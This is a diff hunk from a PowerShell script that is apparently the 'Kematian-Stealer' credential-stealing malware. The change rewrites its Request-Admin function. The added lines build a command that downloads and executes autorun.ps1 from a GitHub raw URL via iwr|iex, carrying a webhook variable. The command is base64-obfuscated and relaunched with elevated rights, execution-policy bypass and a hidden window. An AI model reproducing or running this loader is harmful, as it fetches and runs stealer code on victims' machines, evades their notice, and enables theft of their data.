@@ -130,16 +130,15 @@ function VMPROTECT {
 
 function Request-Admin {
     while (-not (CHECK_AND_PATCH)) {
-        if ($PSCommandPath -eq $null) {
-            Write-Host "Please run the script with admin!" -ForegroundColor Red
-            Start-Sleep -Seconds 5
-            Exit 1
-        }
+        $powershellcode = "`$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex"
+        $powershellcodee = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($powershellcode))
+        $powershellcode = Base64-Obfuscator -Data $powershellcodee
+	
         if ($debug -eq $true) {
-            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
+            try { Start-Process "powershell" -ArgumentList "-NoP -Ep Bypass -c `"$powershellcode`"" -Verb RunAs; exit } catch {}
         }
         else {
-            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit } catch {}
+            try { Start-Process "powershell" -ArgumentList "-Win Hidden -NoP -Ep Bypass -c `"$powershellcode`"" -Verb RunAs; exit } catch {}
         } 
     }    
 }
